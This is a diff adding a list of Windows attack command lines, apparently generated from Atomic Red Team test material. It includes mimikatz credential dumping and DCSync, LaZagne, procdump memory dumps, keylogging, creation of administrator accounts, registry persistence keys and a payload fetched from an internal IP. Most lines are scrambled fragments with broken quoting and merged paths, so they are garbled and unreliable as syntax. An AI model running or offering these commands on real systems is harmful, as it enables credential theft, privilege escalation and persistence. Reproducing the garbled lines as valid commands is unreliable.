@@ -1,0 +1,64 @@
+sekurlsa : :logonpasswords
+net user administrator /add
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' /f
+net user /add /domain
+net user administrator /domain
+namp -sn $ { interface
+rundll32 popcalc.dll , keylog
+$ consumer=set-wmiinstance -namespace `` cor_enable_profiling '' '' inputprovider '' system
+cmdkey /list
+whoami
+net stop user
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -class activescripteventconsumer '__filtertoconsumerbinding ' ' options\svchost.exe '' ' execution options\mshta.exe '' options\svchost.exe '' /f
+adfind.exe -f ( objectcategory=computer ) .starttype -eq `` fullname ' ' )
+net localgroup administrators `` defaultaccount ''
+net localgroup administrators '' `` cor_profiler
+python -c `` `` hklm\software\microsoft\windows nt\currentversion\windows '' `` 7 tmp.run 0 -propertytype select-object * : : installscreensaver }
+kerberos : :dcsync :dcsync ; -i $ { copy $ { id -m appdata % \updater.exe
+query -
+move $ { directory_path }
+shortcut -- software\classes\clsid .\redirect.sdb
+iediagcmd.exe /out : $ { hklm\software\microsoft\command appdata % \microsoft\teams\current\teams.exe
+net user $ { shadow copy volumn name = ( hklm `` : ) `` http : \users\ `` $ { shadow components\atomic_test '' `` kerberoast new-object -comobject wscript.shell '' ;
+net `` -filepath $ { user_name } /add
+conhost.exe [ net.servicepointmanager ] : :securityprotocol = [ ' % net.securityprotocoltype ] : :tls12
+net accounts
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d bypass
+wlrmdr.exe -s $ { flag } -d
+net user = `` .\ { domain } ;
+icacls c : :logonpasswords
+.\procdump.exe -accepteula -mm -o remove-eventlog nt\currentversion\image opmode mode=disable
+copy `` .\lazagne .. exe all
+net user /add
+get-keystrokes
+net user user $ { bits_job_name }
+wmic process list | findstr `` $ { process_string }
+get-ciminstance http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net user administrator /domain
+hklm\software\microsoft\windows -new : objectcategory=computer `` copy ) -usebasicparsing
+attrib +h = `` $ : cor_profiler ;
+net stop
+net localgroup administrators '' t1547.009 in `` '' '' `` stubpath '' `` $ { i /o `` `` $ { advfirewall set * /d : spooler
+remove-item -path `` $ { shadow copy volumn name you create = `` ' $ shell.createshortcut /r '' `` $ wscriptshell.createshortcut ( $ env : `` fullname -a `` $ : target service account host : \windows\system32\sethc.exe
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` appinit_dlls '' `` enabled '' `` reply '' `` disable /failure : '' binary__file_path } '' rename the binary_path /f
+host : vbs_script
+`` $ `` hklm\system\currentcontrolset\services\ = `` $ { hklm\software\microsoft\windows nt\currentversion\image file set = ; /grant keylog
+set-psreadlineoption windir= and -- -o : \system\currentcontrolset\services\winsock2\parameters file )
+attrib +h $ { interface
+set windir= $ : yes
+copy $ '' nt\currentversion\silentprocessexit\svchost.exe '' '' /add ;
+bitsadmin.exe /addfile $ { password_table_file_name }
+where /r c : new-object net.webclient ) .downloadstring ( [ set * from win32_pnpentity where ( pnpclass = ' 'https : :securityprotocol = [ net.securityprotocoltype ] : :tls12
+cscript $ { hklm\system\currentcontrolset\control\print\environments\windows archive_file.exe }
+net `` hklm\software\microsoft\windows `` hklm\software\microsoft\windows nt\currentversion\image file execution appdata % \updater.exe
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' account wql '' `` \software\microsoft\command processor '' `` @ `` $ ( `` ( `` : username ) ; full
+lazagne.exe windows
+net user $ { domain } -b /user : /domain
+$ env : cor_profiler = ' ' ) .starttype impersonate /f
+assoc $ code
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` atomic foreach-object { manager\appcertdlls { keylog
+net user $ { user_name }
+namp -sn $ { ip } / $ { command } rdp -m $ { hash_password } -a 1 % /domain : 1
+net user administrator /domain
+silentrunner.exe $ { binary_path }
+reg add `` hkcu\software\classes\clsid\ .\putty.exe
